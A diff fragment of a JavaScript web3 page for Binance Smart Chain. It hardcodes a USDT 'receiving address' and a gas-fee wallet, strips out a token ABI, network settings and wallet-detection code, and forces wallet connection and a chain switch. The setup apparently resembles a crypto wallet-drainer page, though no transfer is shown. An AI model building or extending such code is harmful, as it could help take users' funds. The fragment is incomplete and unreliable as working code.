@@ -2,67 +2,14 @@ const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT re
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
- const tokenAbi = [
-            {
-                "constant": true,
-                "inputs": [{"name": "who", "type": "address"}],
-                "name": "balanceOf",
-                "outputs": [{"name": "", "type": "uint256"}],
-                "type": "function"
-            },
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "_to", "type": "address"},
-                    {"name": "_value", "type": "uint256"}
-                ],
-                "name": "transfer",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            }
-        ];
-        
-        // Network configuration
-        const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
-        const BSC_MAINNET_PARAMS = {
-            chainId: BSC_MAINNET_CHAIN_ID,
-            chainName: 'Binance Smart Chain Mainnet',
-            nativeCurrency: {
-                name: 'BNB',
-                symbol: 'bnb',
-                decimals: 18
-            },
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com/']
-        };
 let web3;
 let userAddress;
 
-async function initWeb3() {
-    // Detect wallet type based on global objects injected by wallet extensions
-    if (window.trustwallet) {
-        walletType = WALLET_TYPES.TRUST;
-        currentProvider = window.trustwallet;
-    } else if (window.BinanceChain) {
-        walletType = WALLET_TYPES.BINANCE;
-        currentProvider = window.BinanceChain;
-    } else if (window.ethereum) { // Generic Ethereum provider (MetaMask, etc.)
-        walletType = WALLET_TYPES.METAMASK;
-        currentProvider = window.ethereum;
-    } else if (window.web3 && window.web3.currentProvider) { // Older web3.js detection
-        walletType = WALLET_TYPES.UNKNOWN; // Or 'unknown_legacy_web3'
-        currentProvider = window.web3.currentProvider;
-    } else {
-        console.error("No Web3 provider detected. Please install a compatible wallet extension.");
-        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
-        return false;
-    }
-
-    async function connectWallet() {
+async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_accounts" });
+            await window.ethereum.request({ method: "eth_requestAccounts" });
 
             // Force switch to BNB Smart Chain
             await window.ethereum.request({
